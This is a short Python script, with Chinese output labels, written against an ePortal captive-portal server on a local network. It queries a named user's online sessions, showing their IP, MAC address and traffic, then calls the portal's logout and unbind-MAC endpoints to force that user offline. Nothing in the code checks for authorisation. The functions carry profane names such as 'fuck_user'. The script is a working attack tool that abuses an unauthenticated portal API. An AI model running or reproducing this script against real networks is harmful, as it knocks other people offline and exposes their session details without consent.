import requests
import json

def query_user_info(username):
    params = {
        "c": "Portal",
        "a": "online_list",
        "user_account": username,
    }
    r = requests.get(url="http://192.168.200.2:801/eportal", params=params, verify=False, timeout=10)
    print(r)
    print(r.text)
    result = json.loads(r.text[1:-1])
    print(result)
    return result

def print_user_info(username, user_info):
    if user_info["result"] == '0':
        print("  无法找到 {} 的在线信息: {}".format(username, user_info['msg']))
        print("")
        return
    print("用户 {} 的在线信息:".format(username))
    print("")

    for i, session in enumerate(user_info['list']):
        if i != 0:
            print("  -----------------------------")
        print("  Session: #{}".format(i))
        print("  上线时间: {}".format(session['online_time']))
        print("  在线 IP : {}".format(session['online_ip']))
        print("  在线 MAC: {}".format(session['online_mac']))
        print("  上行数据: {} bytes".format(session['uplink_bytes']))
        print("  下载数据: {} bytes".format(session['downlink_bytes']))
        print("")

def fuck_user1(username, ip, mac):
    params = {
        "c": "Portal",
        "a": "unbind_mac",
        # "login_method": "1",
        "user_account": username,
        "wlan_user_ip": ip,
        "wlan_user_mac": "",
        "jsVersion": "3.3.3",
        "v": "4026",
    }
    r = requests.get(url="http://192.168.200.2:801/eportal", params=params, verify=False, timeout=10)
    return json.loads(r.text[1:-1])

def fuck_user2(ip, mac):
    params = {
        "c": "Portal",
        "a": "logout",
        "login_method": "1",
        "user_account": "123",
        "user_password": "123",
        "wlan_user_ip": ip,
        "wlan_user_mac": mac,
        "ac_logout": "1",
        "register_mode": "1",
        "wlan_user_ipv6": "",
        "wlan_vlan_id": "1",
        "wlan_ac_ip": "",
        "wlan_ac_name": "",
        "jsVersion": "3.3.3",
        "v": "5225",
    }
    r = requests.get(url="http://192.168.200.2:801/eportal", params=params, verify=False, timeout=10)
    print(r.text)
    return json.loads(r.text[1:-1])

def fuck_user(username, user_info):
    print("")
    if user_info['msg'] == '在线数据为空':
        return
    for i, session in enumerate(user_info['list']):
        if i != 0:
            print("  -----------------------------")
        print("  F**king Session: #{}\tIP: {}\tMAC: {}".format(i, session['online_ip'], session['online_mac']))
        print("  强制下线 ...")
        status1 = fuck_user1(username, session['online_ip'], session['online_mac'])
        print("  {}".format(status1['msg']))
        print("  解绑 MAC ...")
        status2 = fuck_user2(session['online_ip'], session['online_mac'])
        print("  {}".format(status2['msg']))
        print("")


if __name__ == "__main__":
    username = ""
    print("Username : {}".format(username))
    print("-------------------------------------------")

    user_info = query_user_info(username)
    print_user_info(username, user_info)

    fuck_user(username, user_info)
